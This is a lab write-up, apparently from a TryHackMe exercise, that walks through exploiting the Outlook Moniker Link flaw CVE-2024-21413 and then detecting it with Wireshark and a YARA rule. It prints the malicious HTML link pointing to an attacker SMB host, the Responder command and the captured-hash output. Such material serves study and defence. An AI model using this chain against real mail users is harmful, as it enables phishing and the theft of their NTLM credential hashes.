# üî• 16-CVE-2024-21413‚ÄìPractical Exploitation

This document summarizes the full practical exploitation I performed for CVE-2024-21413 ‚Äî an Outlook Remote Code Execution vulnerability triggered through a malicious Moniker Link inside an HTML email.  
The attack abuses Outlook‚Äôs trust of `file://` URLs, causing the client to automatically initiate an SMB authentication attempt, leaking the victim‚Äôs **netNTLMv2** hash.

---

#  1. Attack Overview

Microsoft Outlook tries to resolve `file://` URLs automatically.

When the victim clicks the malicious HTML link, Outlook attempts to access:

```
file://ATTACKER_IP/test!exploit
```

Windows interprets this as an SMB request and sends NTLM authentication data containing the victim‚Äôs **netNTLMv2** hash.

---

#  2. Starting Responder (Practical Execution)

On the AttackBox, I started Responder to capture incoming SMB authentication attempts:

```bash
sudo responder -I ens5
```

Responder then listened for NTLMv2 hashes sent during the exploitation.

---

#  3. Building & Sending the Malicious Email

I created a Python PoC (`exploit.py`) that generates an HTML email with the Moniker Link:

```html
<a href="file://ATTACKER_IP/test!exploit">Click me</a>
```

Inside the script, I replaced:

- `ATTACKER_IP` ‚Üí my AttackBox IP  
- `MAILSERVER` ‚Üí SMTP server provided by TryHackMe  

Then executed:

```bash
python3 exploit.py
```

The malicious email was delivered to the victim‚Äôs Outlook inbox.

---

#  4. Triggering the Exploit (Victim Side)

On the victim machine:

- I opened the email titled **CVE-2024-21413**
- Clicked the **Click me** link

Outlook automatically attempted an SMB connection:

```
\\ATTACKER_IP\test
```

This caused Windows to send the **netNTLMv2** hash.

---

#  5. Hash Capture Result (Success)

Responder confirmed the hash capture:

```
[SMB] NTLMv2-SSP Hash captured from VICTIM_MACHINE
```

Logs were saved in:

```
/usr/share/responder/logs/
```

This validated full exploitation.

---

#  6. Network Analysis with Wireshark

Using the filter:

```
smb || smb2 || tcp.port == 445
```

I observed:

- SMB NEGOTIATE  
- NTLM CHALLENGE  
- **NTLMSSP_AUTH** (contains leaked netNTLMv2 hash)

This confirmed the authentication flow triggered by the malicious Moniker Link.

---

#  7. YARA-Based Detection

The YARA rule:

```
EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24
```

detects malicious emails by looking for:

- ‚ÄúSubject:‚Äù and ‚ÄúReceived:‚Äù fields  
- Moniker Link matching the regex  
- File size under 1MB  

Useful for analysts performing email security scanning.

---

#  8. Key Learnings

- Full exploitation workflow  
- How Outlook handles Moniker Links internally  
- NTLM authentication behavior  
- Capturing NTLMv2 hashes via Responder  
- Analyzing SMB traffic using Wireshark  
- Understanding PoC logic  
- Defensive detection using YARA  
- How the vulnerability is abused and how it propagates  

---

#  Conclusion

This session provided a complete offensive + defensive understanding of **CVE-2024-21413**, including:

- Exploit execution  
- Hash capture  
- Network traffic analysis  
- YARA detection  
- Full practical reproduction of the vulnerability  

---

# üì¶ NEW REPOSITORY  
## üëâ Repository Name:
**Practical-Vulnerability-Exploitation**

## üìù Description:
Hands-on exploitation of real-world vulnerabilities ‚Äî full write-ups, PoCs, traffic analysis, and detection methods. Each file focuses on one vulnerability from both offensive and defensive perspectives.

---


---
````
